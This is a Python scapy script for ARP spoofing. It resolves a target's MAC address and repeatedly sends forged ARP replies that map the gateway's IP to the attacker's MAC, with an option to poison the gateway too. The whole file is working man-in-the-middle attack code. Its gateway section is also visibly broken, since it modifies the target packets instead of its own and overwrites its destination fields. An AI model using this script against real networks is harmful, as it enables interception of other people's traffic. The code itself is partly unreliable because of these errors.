import scapy
import argparse
import time

from scapy.all import conf, sendp,get_if_hwaddr
from scapy.interfaces import IFACES
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sniff

# Defaults
IFACE=conf.route.route("0.0.0.0")[0]
SRC=conf.route.route("0.0.0.0")[2] # SRC = gateway ip
TARGET=None

# Arguments
parser = argparse.ArgumentParser(description='Spoof ARP tables')
parser.add_argument("-i","--iface",dest="IFACE",default=IFACE,help="Interface you wish to use")
parser.add_argument("-s","--src",dest="SRC",default=SRC,help="The address you want for the attacker")
parser.add_argument("-d","--delay",dest="DELAY",default=1,help="Delay (in seconds) between messages")
parser.add_argument("-gw","--gateway",action="store_true",help="should GW be attacked as well")
parser.add_argument("-t","--target",dest="TARGET",default=None,help="IP of target", required=True)

args = parser.parse_args()
print(args)

if args.IFACE:
    IFACE = args.IFACE
our_mac=get_if_hwaddr(IFACE) # mac address of this interface

if args.SRC:
    SRC = args.SRC

# get target ip
TARGET = args.TARGET
# get target mac
ans = scapy.all.sr1(ARP(pdst=TARGET), timeout=2, verbose=0)
ans.show()
target_mac =ans["ARP"].hwsrc
print(target_mac)



# # packet for target
# 1. Ethernet header
eth = Ether()
eth.src = our_mac                     # our MAC
eth.dst = target_mac                  # unicast reply

# 2. ARP payload (op=2 === is-at)
arp = ARP()
arp.op = 2                            # 2 == "is-at"
arp.hwsrc = our_mac
arp.psrc  = SRC                     #
arp.hwdst = target_mac
arp.pdst  = TARGET

# 3. Stack: Ether / ARP
arp_reply = eth / arp

# # packet for gateway
# 1. Ethernet header
ethgw = Ether()
eth.src = our_mac                     # sender MAC
if TARGET:
    eth.dst = TARGET              # unicast reply

    eth.dst = "ff:ff:ff:ff:ff:ff"      # broadcast reply

# 2. ARP payload (op=2 === is-at)
arpgw = ARP()
arp.op = 2                            # 2 == "is-at"
arp.hwsrc = our_mac
arp.psrc  = TARGET
arp.hwdst = "00:00:00:00:00:00"
arp.pdst  = "0.0.0.0"

# 3. Stack: Ether / ARP
gw_packet  = ethgw / arpgw



for i in range(0,5):
    sendp(arp_reply)
    print("Sent ARP table to {}".format(TARGET))
    if args.gateway:
        sendp(gw_packet)
        print("Sent ARP table to gateway")
    time.sleep(args.DELAY)

